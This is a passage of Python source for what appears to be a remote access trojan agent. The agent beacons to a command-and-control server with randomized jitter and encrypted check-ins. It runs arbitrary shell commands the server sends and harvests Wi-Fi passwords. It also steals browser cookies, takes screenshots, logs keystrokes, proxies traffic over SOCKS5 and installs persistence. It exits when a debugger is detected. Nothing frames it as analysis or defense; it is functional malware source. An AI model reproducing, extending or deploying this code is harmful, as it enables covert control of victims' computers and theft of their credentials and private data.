                self.logger.warning("WebSocket disconnected")
                self.connected = False

            self.socket.connect(
                self.server_url,
                headers={
                    'User-Agent': self.config.USER_AGENT,
                    'X-Agent-ID': self.agent_id
                },
                transports=['websocket'],
                namespaces=['/terminal']
            )

            if not connected_event.wait(connection_timeout):
                self.logger.error("WebSocket connection timed out")
                return False
            
            self.logger.info("WebSocket connection established successfully")
            return True

        except Exception as e:
            self.logger.error(f"WebSocket connection failed: {str(e)}")
            return False
        
    def _execute_command(self, command):
        try:
            self.logger.info(f"Executing: {command}")
            
            if command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    if new_dir:
                        os.chdir(new_dir)
                    self.current_dir = os.getcwd()
                    return {
                        'output': f"Current directory is now: {self.current_dir}",
                        'current_dir': self.current_dir
                    }
                except Exception as e:
                    return {
                        'error': str(e),
                        'current_dir': self.current_dir
                    }

            result = subprocess.run(
                command,
                shell=True,
                cwd=self.current_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30
            )
            
            self.current_dir = os.getcwd()
            
            return {
                'output': result.stdout,
                'error': result.stderr,
                'current_dir': self.current_dir
            }
            
        except subprocess.TimeoutExpired:
            return {
                'error': 'Command timed out after 30 seconds',
                'current_dir': self.current_dir
            }
        except Exception as e:
            return {
                'error': str(e),
                'current_dir': self.current_dir
            }

    def disconnect(self):
        if self.socket:
            try:
                self.logger.info("Disconnecting WebSocket")
                self.socket.disconnect()
            except Exception as e:
                self.logger.error(f"Disconnect error: {str(e)}")
        self.connected = False

# ======================
# Main Agent Class
# ======================
class Agent:
    def __init__(self):
        self.logger = logging.getLogger('agent.main')
        self.config = Config()
        self.crypto = Crypto(self.config.AES_KEY, self.config.AES_IV)
        self.agent_id = self._generate_agent_id()
        self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
        self.keylogger = Keylogger()
        self.ws_client = None
        self.last_checkin = 0
        self.jitter = 0.3
        self._initial_checkin = None
        self._checkin_count = 0
        self._running = True

    def _generate_agent_id(self):
        return f"{platform.node()}-{os.getlogin()}-{hash(os.getcwd())}"

    def _get_checkin_data(self):
        data = {
            "agent_id": self.agent_id,
            "hostname": platform.node(),
            "username": os.getlogin(),
            "os": platform.platform(),
            "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
            "ip": requests.get('https://api.ipify.org', timeout=5).text,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
        }

        if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
            data["credentials"] = {
                "wifi": CredentialHarvester.get_wifi_passwords()
            }
            if not self._initial_checkin:
                self._initial_checkin = time.time()
        
        if self.config.TAKE_SCREENSHOTS:
            if self._checkin_count % self.config.SCREENSHOT_FREQUENCY == 0:
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    data["screenshot"] = screenshot

        self._checkin_count += 1
        return data

    def _execute_task(self, task):
        try:
            task_type = task.get("type")
            self.logger.info(f"Received task: {json.dumps(task, indent=2)}")
            
            if task_type == "websocket":
                action = task.get("action") or task.get("data", {}).get("action")
                if not action:
                    self.logger.error("WebSocket task missing action parameter")
                    return {
                        "status": "error",
                        "message": "WebSocket task requires 'action' parameter"
                    }
                
                self.logger.info(f"Processing WebSocket {action} request")
                
                if action == "start":
                    if not hasattr(self, 'ws_client') or not self.ws_client:
                        self.logger.info("Initializing new WebSocket client")
                        self.ws_client = WebSocketClient(
                            self.agent_id,
                            self.crypto,
                            self.config.C2_SERVER,
                            self.config
                        )
                    
                    if not self.ws_client.connected:
                        self.logger.info("Attempting WebSocket connection...")
                        if self.ws_client.connect():
                            return {
                                "status": "success",
                                "message": "WebSocket connected",
                                "action": "start"
                            }
                        else:
                            return {
                                "status": "error",
                                "message": "Failed to connect WebSocket",
                                "action": "start"
                            }
                    return {
                        "status": "success",
                        "message": "WebSocket already connected",
                        "action": "start"
                    }
                
                elif action == "stop":
                    if hasattr(self, 'ws_client') and self.ws_client and self.ws_client.connected:
                        self.ws_client.disconnect()
                        return {
                            "status": "success",
                            "message": "WebSocket disconnected",
                            "action": "stop"
                        }
                    return {
                        "status": "error",
                        "message": "No active WebSocket connection",
                        "action": "stop"
                    }
            
            elif task_type == "shell":
                command = task.get("data", {}).get("cmd", "")
                if not command:
                    return {
                        "status": "error",
                        "message": "No command provided"
                    }
                
                current_dir = os.getcwd()
                
                if command.lower().startswith("cd "):
                    new_dir = command[3:].strip()
                    try:
                        if new_dir:
                            os.chdir(new_dir)
                        current_dir = os.getcwd()
                        return {
                            "status": "success",
                            "output": f"Current directory is now: {current_dir}",
                            "current_dir": current_dir
                        }
                    except Exception as e:
                        return {
                            "status": "error",
                            "error": str(e),
                            "current_dir": current_dir
                        }
                
                result = subprocess.run(
                    command,
                    shell=True,
                    cwd=current_dir,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=30
                )
                current_dir = os.getcwd()
                
                return {
                    "status": "success",
                    "output": result.stdout,
                    "error": result.stderr,
                    "current_dir": current_dir,
                    "terminal": True
                }
            
            elif task_type == "screenshot":
                screenshot = SystemUtils.take_screenshot()
                if screenshot:
                    return {
                        "status": "success",
                        "screenshot": screenshot
                    }
                return {"status": "error", "message": "Failed to capture screenshot"}
            
            elif task_type == "steal_cookies":
                try:
                    self.logger.info("Starting cookie stealing task")
                    stealer = CookieStealer()
                    results = stealer.steal_cookies()
                    
                    if not results:
                        return {
                            "status": "error",
                            "message": "No cookies were stolen"
                        }
                    
                    return {
                        "status": "success",
                        "message": f"Stole cookies from {len(results)} browsers",
                        "results": results
                    }
                except Exception as e:
                    self.logger.error(f"Cookie stealing failed: {str(e)}")
                    return {
                        "status": "error",
                        "message": str(e)
                    }

            elif task_type == "upload":
                return SystemUtils.upload_file(task.get("path", ""))
            
            elif task_type == "download":
                return SystemUtils.download_file(
                    task.get("filename", ""), 
                    task.get("data", ""))
            
            elif task_type == "persist":
                self.logger.info("Installing persistence")
                return Persistence.install(self.config.C2_SERVER)
            
            elif task_type == "socks5":
                if task.get("action") == "start":
                    return self.socks_proxy.start()
                else:
                    return self.socks_proxy.stop()
            
            elif task_type == "keylogger":
                if task.get("action") == "start":
                    return self.keylogger.start()
                else:
                    result = self.keylogger.get_logs()
                    self.keylogger.stop()
                    return {"logs": result}
            
            else:
                return {
                    "status": "error",
                    "message": f"Unknown task type: {task_type}"
                }
        
        except Exception as e:
            self.logger.error(f"Error executing task: {str(e)}")
            return {
                "status": "error",
                "message": f"Task execution failed: {str(e)}"
            }

    def beacon(self):
        self.logger.info("[*] Starting beacon loop...")
        while self._running:
            try:
                sleep_time = self.config.CHECKIN_INTERVAL * (1 + (random.random() * self.jitter * 2 - self.jitter))
                time.sleep(sleep_time)
                
                checkin_data = self._get_checkin_data()
                encrypted_data = self.crypto.encrypt(checkin_data)
                
                response = requests.post(
                    f"{self.config.C2_SERVER}/api/checkin",
                    data=encrypted_data,
                    headers={
                        "User-Agent": self.config.USER_AGENT,
                        "Content-Type": "application/octet-stream"
                    },
                    timeout=30,
                    verify=False
                )
                
                if response.status_code == 200:
                    task = self.crypto.decrypt(response.content)
                    
                    if task.get("type") != "noop":
                        result = self._execute_task(task)
                        
                        requests.post(
                            f"{self.config.C2_SERVER}/api/task_result",
                            data=self.crypto.encrypt({
                                "task_id": task.get("task_id"),
                                "agent_id": self.agent_id,
                                "task_type": task.get("type"),
                                "result": result
                            }),
                            headers={
                                "User-Agent": self.config.USER_AGENT,
                                "Content-Type": "application/octet-stream"
                            },
                            timeout=30,
                            verify=False
                        )
                
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Connection error: {str(e)}")
                time.sleep(self.config.CHECKIN_INTERVAL * 2)
            except Exception as e:
                self.logger.error(f"Unexpected error: {str(e)}")
                time.sleep(self.config.CHECKIN_INTERVAL)

    def stop(self):
        self._running = False
        self.socks_proxy.stop()
        self.keylogger.stop()
        if self.ws_client:
            self.ws_client.disconnect()

    def run(self):
        self.logger.info("[*] Starting agent...")
        self.beacon()

if __name__ == "__main__":
    def is_debugging():
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent() != 0:
                    print("[!] Debugger detected - exiting")
                    return True
            return False
        except:
            return False
    
    if is_debugging():
        sys.exit(0)
    
    try:
        agent = Agent()
        agent.run()
    except Exception as e:
        print(f"[!] Agent crashed: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)